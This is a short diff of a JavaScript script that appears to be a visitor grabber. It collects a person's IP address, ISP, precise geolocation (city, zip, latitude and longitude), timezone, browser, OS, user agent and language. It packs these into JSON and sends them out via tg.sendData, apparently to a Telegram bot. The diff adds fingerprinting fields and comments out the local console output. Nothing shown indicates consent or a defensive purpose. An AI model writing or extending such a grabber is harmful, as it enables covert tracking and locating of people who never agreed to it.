@@ -41,9 +41,14 @@ const request = async () => { // Calling a "synchronous" fetch
 
     const map = new Map([
 	["time", time],
+	["user_time", userTime],
+	["browser", browser],
+	["os", os],
+	["useragent", useragent],
 	["ip", ip],
 	["provider", provider],
 	["timezone", timezone],
+	["language", language],
 	["country", country],
 	["country_code", countryCode],
 	["region", region],
@@ -53,7 +58,7 @@ const request = async () => { // Calling a "synchronous" fetch
 	["longitude", lon]
     ]);
 
-	console.log(time);
+	/* console.log(time);
 	console.log(userTime);
 	console.log(browser);
 	console.log(os);
@@ -68,7 +73,7 @@ const request = async () => { // Calling a "synchronous" fetch
     console.log(city);
     console.log(zip);
     console.log(lat);
-    console.log(lon);
+    console.log(lon); */
 
     const log = mapToJSON(map);
     tg.sendData(log);
